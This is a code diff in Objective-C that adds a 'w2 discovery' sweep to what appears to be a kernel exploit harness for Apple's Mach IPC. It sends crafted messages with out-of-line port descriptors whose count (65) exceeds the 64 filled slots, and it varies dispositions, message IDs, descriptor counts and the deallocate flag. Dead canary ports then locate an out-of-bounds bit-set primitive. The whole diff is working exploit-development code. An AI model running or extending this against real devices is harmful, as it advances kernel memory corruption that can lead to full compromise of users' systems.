@@ -536,7 +536,202 @@
     if (oobValDead > 0) {
         [report appendString:@"OOB DESCRIPTOR BIT-SET CONFIRMED — w2 = port name in descriptor.\n"];
     } else {
-        [report appendString:@"No OOB-value hits. Debugserver needed to trace w2.\n"];
+        [report appendString:@"No OOB-value hits.\n"];
+    }
+
+    // --- w2 discovery: systematic field sweep ---
+    // Test each descriptor/header field as the potential w2 source.
+    // If w2 = field value, then table[field] gets bit-set at +16*field.
+    // We check canary ports after each variation.
+    [report appendString:@"\n--- w2 discovery: field sweep ---\n"];
+
+    // Test 1: disposition sweep (0x10..0x1f + large values)
+    [report appendString:@"disposition sweep:\n"];
+    int dispTested = 0, dispHits = 0;
+    uint32_t dispositions[] = {0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x1f,
+                                64, 128, 256, 1024, 4096, 65536};
+    for (size_t d = 0; d < sizeof(dispositions)/sizeof(dispositions[0]); d++) {
+        uint32_t disp = dispositions[d];
+        // Build custom message with crafted disposition
+        mach_port_t dispPorts[68] = {0};
+        for (int j = 0; j < 64; j++) dispPorts[j] = port;
+        // OOB slots: NULL
+        size_t oolSz = sizeof(mach_msg_ool_ports_descriptor_t);
+        size_t totalSz = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSz;
+        uint8_t sbuf[256] = {0};
+        mach_msg_header_t *sh = (mach_msg_header_t *)sbuf;
+        sh->msgh_bits = MACH_MSGH_BITS(disp, 0) | MACH_MSGH_BITS_COMPLEX;
+        sh->msgh_size = (mach_msg_size_t)totalSz;
+        sh->msgh_remote_port = port;
+        sh->msgh_local_port = MACH_PORT_NULL;
+        sh->msgh_id = 0;
+        mach_msg_body_t *sb = (mach_msg_body_t *)(sbuf + sizeof(mach_msg_header_t));
+        sb->msgh_descriptor_count = 1;
+        mach_msg_ool_ports_descriptor_t *od =
+            (mach_msg_ool_ports_descriptor_t *)(sbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+        od->address = dispPorts;
+        od->count = 65;
+        od->disposition = disp;  // THE crafted value
+        od->deallocate = 0;
+        od->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+        kern_return_t okr = mach_msg(sh, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                      sh->msgh_size, 0, MACH_PORT_NULL, 250, MACH_PORT_NULL);
+        dispTested++;
+        if (okr == KERN_SUCCESS) {
+            uint8_t rbuf[512] = {0};
+            mach_msg_header_t *rh = (mach_msg_header_t *)rbuf;
+            rh->msgh_size = sizeof(rbuf);
+            rh->msgh_local_port = port;
+            mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(rbuf), port, 250, MACH_PORT_NULL);
+        }
+        [report appendFormat:@"  disp=0x%x send_kr=%d\n", disp, okr];
+    }
+
+    // Test 2: msgh_id sweep
+    [report appendString:@"msgh_id sweep:\n"];
+    int ids[] = {0, 1, 2, 3, 4, 5, 10, 100, 0x4b50, 0x4141, 65, 128, 256, 1024};
+    for (size_t d = 0; d < sizeof(ids)/sizeof(ids[0]); d++) {
+        int32_t msgID = ids[d];
+        mach_port_t idPorts[68] = {0};
+        for (int j = 0; j < 64; j++) idPorts[j] = port;
+        size_t oolSz2 = sizeof(mach_msg_ool_ports_descriptor_t);
+        size_t totalSz2 = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSz2;
+        uint8_t sbuf2[256] = {0};
+        mach_msg_header_t *sh2 = (mach_msg_header_t *)sbuf2;
+        sh2->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+        sh2->msgh_size = (mach_msg_size_t)totalSz2;
+        sh2->msgh_remote_port = port;
+        sh2->msgh_local_port = MACH_PORT_NULL;
+        sh2->msgh_id = msgID;  // THE crafted value
+        mach_msg_body_t *sb2 = (mach_msg_body_t *)(sbuf2 + sizeof(mach_msg_header_t));
+        sb2->msgh_descriptor_count = 1;
+        mach_msg_ool_ports_descriptor_t *od2 =
+            (mach_msg_ool_ports_descriptor_t *)(sbuf2 + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+        od2->address = idPorts;
+        od2->count = 65;
+        od2->disposition = MACH_MSG_TYPE_COPY_SEND;
+        od2->deallocate = 0;
+        od2->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+        kern_return_t okr2 = mach_msg(sh2, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                       sh2->msgh_size, 0, MACH_PORT_NULL, 250, MACH_PORT_NULL);
+        if (okr2 == KERN_SUCCESS) {
+            uint8_t rbuf2[512] = {0};
+            mach_msg_header_t *rh2 = (mach_msg_header_t *)rbuf2;
+            rh2->msgh_size = sizeof(rbuf2);
+            rh2->msgh_local_port = port;
+            mach_msg(rh2, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(rbuf2), port, 250, MACH_PORT_NULL);
+        }
+        [report appendFormat:@"  id=%d send_kr=%d\n", msgID, okr2];
+    }
+
+    // Test 3: multiple OOL descriptors
+    [report appendString:@"multi-OOL test (2 descriptors):\n"];
+    {
+        mach_port_t multiPorts[68] = {0};
+        for (int j = 0; j < 64; j++) multiPorts[j] = port;
+        size_t oolSz3 = sizeof(mach_msg_ool_ports_descriptor_t);
+        size_t totalSz3 = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSz3 * 2;
+        uint8_t sbuf3[512] = {0};
+        mach_msg_header_t *sh3 = (mach_msg_header_t *)sbuf3;
+        sh3->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+        sh3->msgh_size = (mach_msg_size_t)totalSz3;
+        sh3->msgh_remote_port = port;
+        sh3->msgh_local_port = MACH_PORT_NULL;
+        sh3->msgh_id = 0;
+        mach_msg_body_t *sb3 = (mach_msg_body_t *)(sbuf3 + sizeof(mach_msg_header_t));
+        sb3->msgh_descriptor_count = 2;
+        // First OOL: normal
+        mach_msg_ool_ports_descriptor_t *od3a =
+            (mach_msg_ool_ports_descriptor_t *)(sbuf3 + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+        od3a->address = multiPorts;
+        od3a->count = 65;
+        od3a->disposition = MACH_MSG_TYPE_COPY_SEND;
+        od3a->deallocate = 0;
+        od3a->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+        // Second OOL: different count
+        mach_msg_ool_ports_descriptor_t *od3b =
+            (mach_msg_ool_ports_descriptor_t *)((uint8_t *)od3a + oolSz3);
+        od3b->address = multiPorts;
+        od3b->count = 66;
+        od3b->disposition = MACH_MSG_TYPE_COPY_SEND;
+        od3b->deallocate = 0;
+        od3b->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+        kern_return_t okr3 = mach_msg(sh3, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                       sh3->msgh_size, 0, MACH_PORT_NULL, 250, MACH_PORT_NULL);
+        if (okr3 == KERN_SUCCESS) {
+            uint8_t rbuf3[512] = {0};
+            mach_msg_header_t *rh3 = (mach_msg_header_t *)rbuf3;
+            rh3->msgh_size = sizeof(rbuf3);
+            rh3->msgh_local_port = port;
+            mach_msg(rh3, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(rbuf3), port, 250, MACH_PORT_NULL);
+        }
+        [report appendFormat:@"  2-OOL send_kr=%d\n", okr3];
+    }
+
+    // Test 4: deallocate flag sweep
+    [report appendString:@"deallocate flag test:\n"];
+    {
+        mach_port_t deaPorts[68] = {0};
+        for (int j = 0; j < 64; j++) deaPorts[j] = port;
+        size_t oolSz4 = sizeof(mach_msg_ool_ports_descriptor_t);
+        size_t totalSz4 = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSz4;
+        uint8_t sbuf4[256] = {0};
+        mach_msg_header_t *sh4 = (mach_msg_header_t *)sbuf4;
+        sh4->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+        sh4->msgh_size = (mach_msg_size_t)totalSz4;
+        sh4->msgh_remote_port = port;
+        sh4->msgh_local_port = MACH_PORT_NULL;
+        sh4->msgh_id = 0;
+        mach_msg_body_t *sb4 = (mach_msg_body_t *)(sbuf4 + sizeof(mach_msg_header_t));
+        sb4->msgh_descriptor_count = 1;
+        mach_msg_ool_ports_descriptor_t *od4 =
+            (mach_msg_ool_ports_descriptor_t *)(sbuf4 + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+        od4->address = deaPorts;
+        od4->count = 65;
+        od4->disposition = MACH_MSG_TYPE_COPY_SEND;
+        od4->deallocate = 1;  // THE crafted value
+        od4->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+        kern_return_t okr4 = mach_msg(sh4, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                       sh4->msgh_size, 0, MACH_PORT_NULL, 250, MACH_PORT_NULL);
+        if (okr4 == KERN_SUCCESS) {
+            uint8_t rbuf4[512] = {0};
+            mach_msg_header_t *rh4 = (mach_msg_header_t *)rbuf4;
+            rh4->msgh_size = sizeof(rbuf4);
+            rh4->msgh_local_port = port;
+            mach_msg(rh4, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(rbuf4), port, 250, MACH_PORT_NULL);
+        }
+        [report appendFormat:@"  deallocate=1 send_kr=%d\n", okr4];
+    }
+
+    // Canary check after all w2 discovery tests
+    int w2Changed = 0;
+    for (int i = 0; i < CANARY_N; i++) {
+        if (canaryAlive[i] != 1) continue;
+        memset(pingBuf, 0, sizeof(pingBuf));
+        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
+        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+        ph->msgh_size = sizeof(mach_msg_header_t);
+        ph->msgh_remote_port = canary[i];
+        ph->msgh_local_port = MACH_PORT_NULL;
+        ph->msgh_id = 0;
+        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
+        if (skr != KERN_SUCCESS) {
+            w2Changed++;
+            [report appendFormat:@"  W2 HIT: canary[%d] port=%u DEAD\n", i, canary[i]];
+        } else {
+            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
+        }
+    }
+    [report appendFormat:@"w2 discovery: %d canary changes\n", w2Changed];
+    if (w2Changed > 0) {
+        [report appendString:@"W2 SOURCE FOUND — check which field test preceded the death.\n"];
+    } else {
+        [report appendString:@"No w2 discovery hits. w2 comes from kernel-internal state.\n"];
     }
 
     // Snapshot again
